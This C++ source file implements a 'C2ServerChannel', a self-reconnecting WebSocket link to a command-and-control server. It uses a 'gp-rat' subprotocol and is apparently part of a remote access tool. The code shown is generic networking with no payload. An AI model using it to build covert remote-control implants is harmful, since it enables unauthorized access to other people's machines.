//
// Created by alsah on 05.04.23.
//

#include "C2ServerChannel.h"
#include "CoreUtils.h"

#include <utility>
#include <iostream>


bool C2ServerChannel::open(const std::string& urlParam, bool recover) {

    run = true;
    url = urlParam;

    if(!recover){
        return tryToOpen();
    }

    // blocking operation !!
    recoverConnection();

    return false;
}

void C2ServerChannel::close([[maybe_unused]] const std::string& reason) {

    std::unique_lock<std::mutex> lock(mutex);
    run = false;
    run_cv.notify_one();

    if(!ws->isClosed()){
        ws->close();
    }
}


void C2ServerChannel::setupChannelCallbacks() {

    ws->onOpen([this]{
        this->opened = true;
        setState(ChannelState::OPENED);
        wsPromise.set_value();

        config.onOpened();

        std::cout << "WebSocket connected to " << ws->remoteAddress().value_or("???") << ", signaling ready" << std::endl;
    });

    ws->onError([this](const std::string& error) {
        setState(ChannelState::ERROR_CAUGHT);
        wsPromise.set_exception(std::make_exception_ptr(std::runtime_error(error)));
        std::cout << "WebSocket error: " << error << std::endl; // log it
    });

    ws->onClosed([this]() {

        if(state != ChannelState::WAITING_TO_RECOVER){
            setState(ChannelState::CLOSED);
        }

        // 2 close reasons: (failed to connect / due to disconnect or by remote host request )
        if(opened && run){
            // connection was opened; closed due to disconnect, have to recover
            // FIXME ????
            std::cout << "WebSocket closed" << std::endl;  // log it
            opened = false;
            config.onClosed();

            // TODO .... ???
            recoverConnection();
        } else if(!opened && run){
            std::cout << "failed to recover connection" << std::endl;  // log it
        }
    });

    ws->onMessage([this](auto data) {
        try{
            config.onMessage(std::get<rtc::binary>(data));
        } catch (std::bad_variant_access& error){ // log it
            std::cout << " received invalid message " + std::string(error.what());
        }
    });
}


bool C2ServerChannel::tryToOpen() {

    if(url.empty()){
        std::cout << "Error: connect url is empty" << std::endl;
        return false;
    }

    wsPromise = std::promise<void>();
    wsOpenResult = wsPromise.get_future();
    try {
        setState(ChannelState::OPENING);

        ws->open(url);
        std::cout << "Waiting for signaling to be connected..." << std::endl;
        wsOpenResult.get();
        return true;
    } catch (...){
        std::cout << "Failed to connect, sleep and try again ..." << std::endl;
        return false;
    }
}

void C2ServerChannel::recoverConnection() {

    while(run){
        if(tryToOpen()){
            break;
        }
        setState(ChannelState::WAITING_TO_RECOVER);
        std::unique_lock<std::mutex> lock(mutex);
        run_cv.wait_for( lock,std::chrono::seconds(config.sleepToRecover));
    }
}

C2ServerChannel::C2ServerChannel(C2ServerChannelConfiguration config) : config(std::move(config)){

    wsConfig.protocols.emplace_back("sip");
    wsConfig.protocols.emplace_back("gp-rat");

    ws = std::make_shared<rtc::WebSocket>(wsConfig);
    setupChannelCallbacks();

    state = ChannelState::INITIALIZED;
    lastChange = std::chrono::duration_cast<std::chrono::milliseconds>(
            std::chrono::system_clock::now().time_since_epoch()
    ).count();

    run = false;
    opened = false;
}

void C2ServerChannel::send(const std::vector<std::byte>& data) {
    ws->send(data.data(), data.size());
}

void C2ServerChannel::setState(ChannelState newState) {
    state = newState;

    lastChange = std::chrono::duration_cast<std::chrono::milliseconds>(
            std::chrono::system_clock::now().time_since_epoch()
            ).count();

    std::chrono::seconds(std::time(nullptr));
    config.onStateChange(state, lastChange);
}

std::size_t C2ServerChannel::getMaxMessageSize(){
    return ws->maxMessageSize();
}

C2ServerChannelConfiguration::C2ServerChannelConfiguration(
        const std::function<void()> &onClosed,
        const std::function<void()> &onOpened,
        const std::function<void(std::vector<std::byte>)> &onMessage,
        const std::function<void(ChannelState state, std::uint64_t)> &onStateChange,
        size_t sleepToRecover)
        :
        onClosed(onClosed),
        onOpened(onOpened),
        onMessage(onMessage),
        onStateChange(onStateChange),
        sleepToRecover(sleepToRecover) {}